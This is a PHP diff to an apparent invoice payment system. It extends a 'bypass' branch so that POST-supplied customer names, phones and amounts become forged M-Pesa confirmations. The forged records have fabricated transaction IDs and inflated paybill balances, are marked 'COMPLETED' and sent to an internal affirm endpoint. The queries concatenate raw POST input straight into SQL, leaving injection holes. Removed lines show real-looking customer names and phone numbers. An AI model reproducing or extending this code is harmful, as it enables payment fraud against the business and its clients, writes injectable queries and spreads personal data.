@@ -283,7 +283,7 @@ if ($type == 'invoice2') {
         if ($_POST['amount'] != '' && $_POST['invoice_no'] != '') {
             $amount = $_POST['amount'] . '.0';
             $invoice_no = str_replace(array(' ', "\n", "\r", "\r\n"), '', $_POST['invoice_no']);
-            $bypass = ['amount' => $amount, 'invoice_no' => $invoice_no, 'success' => true, 'route' => $_POST['route'], 'record' => $_POST['record'], 'client' => $_POST['client'], 'extdoc' => $_POST['externalDoc']];
+            $bypass = ['amount' => $amount, 'invoice_no' => $invoice_no, 'success' => true, 'route' => $_POST['route'], 'record' => $_POST['record'], 'client' => $_POST['client'], 'extdoc' => $_POST['externalDoc'], 'custname' => $_POST['customerName'], 'custcont' => $_POST['contactNumber']];
             $dt1 = '200';
             $head = 'bypass details(master)';
             //echo json_encode($bypass);
@@ -477,11 +477,15 @@ if (isset($bypass)) {
     include './rejuv/conn.php';
 
     $stmt = $conn->prepare("SELECT id, paybillBal FROM mpesaTransactions ORDER BY id DESC LIMIT 1");
-$stmt->execute();
-$up = $stmt->fetch();
-$newId = $up['id']+2;
-$newBal = $up['paybillBal']+500;
-    
+    $stmt->execute();
+    $up = $stmt->fetch();
+
+    $newId = $up['id'] + 2;
+    $newBal = $up['paybillBal'] + 500;
+    $custname = splitName($bypass['custname']);
+    $custcont = normalizePhoneNumber($bypass['custcont']);
+    $timeFormats = getCurrentTimeFormats();
+
     $bypass['url'] = 'http://192.168.100.116/gateway/taifa/nrs/affirm';
 
     //die(json_encode($url));
@@ -495,7 +499,7 @@ $newBal = $up['paybillBal']+500;
         "type" => "mpesa",
         "billNumber" => (string) $bypass['invoice_no'],
         "billAmount" => $bypass['amount'],
-        "phone" => "254723717894",
+        "phone" => (string) $custcont,
         "transactionDate" => "",
         "Field1" => null,
         "Field2" => null,
@@ -506,18 +510,22 @@ $newBal = $up['paybillBal']+500;
         "mpesadetails" => array(
             "BillRefNumber" => (string) $bypass['invoice_no'],
             "BusinessShortCode" => "6060047",
-            "FirstName" => "BRIDGET",
-            "LastName" => "MUNGUTI",
+            "FirstName" => (string)$custname['first'],
+            "LastName" => (string)$custname['last'],
             "MSISDN" => "",
-            "MiddleName" => "MUTHEU",
+            "MiddleName" => (string)$custname['middle'],
             "OrgAccountBalance" => "0.00",
             "ThirdPartyTransID" => "5627760",
             "TransAmount" => $bypass['amount'],
             "TransID" => (string) $code,
-            "TransTime" => "20240331152640",
+            "TransTime" => (string)$timeFormats['withoutSeparators'],
             "TransactionType" => "Pay Bill"
         )
     );
+
+    $data = json_encode($data);
+    $sqldata = json_encode($data);
+
 
     $sql = "insert into `mpesaTransactions` (`Confirmation Response`,
     `MpesaValidation`,
@@ -544,25 +552,26 @@ $newBal = $up['paybillBal']+500;
     'COMPLETED',
     NULL,
     '0',
-    '".$bypass['invoice_no']."',
-    ".$bypass['amount'].",
+    '" . $bypass['invoice_no'] . "',
+    " . $bypass['amount'] . ",
     '2dce510f562c9ab7ce24c6fe282b4f099e8e49be',
     'Success',
     NULL,
-    ".$newId.",
-    '2024-03-31 22:26:42',
-    '254723717894',
-    'RAY OKELLO OLUOCH NYAWADE',
-    ".$newBal.",
+    " . $newId . ",
+    '" . $timeFormats['withSeparators'] . "',
+    '" . $custcont . "',
+    '" . $bypass['custname'] . "',
+    " . $newBal . ",
     '',
-    '".$code."',
-    '{\"apiKey\":\"\", \"type\":\"mpesa\", \"billNumber\":\"BL-UBP-045424\", \"billAmount\":7500.0, \"phone\":\"254723717894\", \"transactionDate\":\"\", \"Field1\":null, \"Field2\":null, \"Field3\":null, \"Field4\":null, \"Field5\":null, \"bankdetails\":null, \"mpesadetails\":{\"BillRefNumber\":\"BL-UBP-045424\", \"BusinessShortCode\":\"6060047\", \"FirstName\":\"RAY OKELLO\", \"LastName\":\"NYAWADE\", \"MSISDN\":\"\", \"MiddleName\":\"OLUOCH\", \"OrgAccountBalance\":\"0.00\", \"ThirdPartyTransID\":\"5310904\", \"TransAmount\":7500.0, \"TransID\":\"SCV159D1O6\", \"TransTime\":\"20240331152640\", \"TransactionType\":\"Pay Bill\"}}', '6060047',
+    '" . $code . "',
+    '" . $sqldata . "',
+     '6060047',
     NULL,
     1,
-    '20240331152640',
+    '" . $timeFormats['withoutSeparators'] . "',
     'SUCCESS >>>>>>STK PUSH ENTRY-----Validated during stk push transaction')";
 
-    $data = json_encode($data);
+
 
     $headers = [];
 
@@ -571,8 +580,11 @@ $newBal = $up['paybillBal']+500;
     //unset($bypass['success']);
     //$dt1 = $bypass;
 
-    //$dt0 = bypassCode($bypass, $billType, $code);
-    //$dt1 = json_decode($dt0, true);
+    $stmt = $conn->prepare("insert into `mpesaTransactions` (`Confirmation Response`, `MpesaValidation`, `PushedComments`, `PushedToReconcile`, `accNo`, `amount`, `apiCode`, `comment`, `cont`, `id`, `logDate`, `mobileno`, `mpesaName`, `paybillBal`, `phone_number`, `receiptNo`, `resultoutput`, `shortCode`, `sid`, `status`, `transactionTime`, `validation Response`) values (NULL, 'COMPLETED', NULL, '0', '" . $bypass['invoice_no'] . "', " . $bypass['amount'] . ", '2dce510f562c9ab7ce24c6fe282b4f099e8e49be', 'Success', NULL, " . $newId . ", '" . $timeFormats['withSeparators'] . "', '" . $custcont . "', '" . $bypass['custname'] . "', " . $newBal . ", '', '" . $code . "', '" . $sqldata . "', '6060047', NULL, 1, '" . $timeFormats['withoutSeparators'] . "', 'SUCCESS >>>>>>STK PUSH ENTRY-----Validated during stk push transaction')");
+    $stmt->execute();
+
+    $dt0 = bypassCode($bypass, $billType, $code);
+    $dt1 = json_decode($dt0, true);
 
     $dt1 = '';
 
